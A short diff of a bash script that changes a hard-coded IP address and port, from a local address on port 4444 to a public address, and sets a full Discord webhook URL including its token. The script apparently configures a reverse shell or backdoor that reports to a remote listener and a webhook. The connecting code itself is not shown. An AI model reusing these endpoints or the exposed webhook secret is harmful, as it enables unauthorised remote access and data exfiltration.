@@ -1,8 +1,8 @@
 #!/bin/bash
 
 # Hard-coded IP and port
-ip_addr="192.168.0.107"
-port="4444"
+ip_addr="193.161.193.99"
+port="48306"
 
 # Discord webhook URL (replace with your actual webhook URL)
 webhook_url="https://discord.com/api/webhooks/1264765951304400988/n9j21NuQaNl6kJpELTOWiuJeamFuZgqvbQasu__R5bumeALy4-6nyJgizai_2DGjbia3"
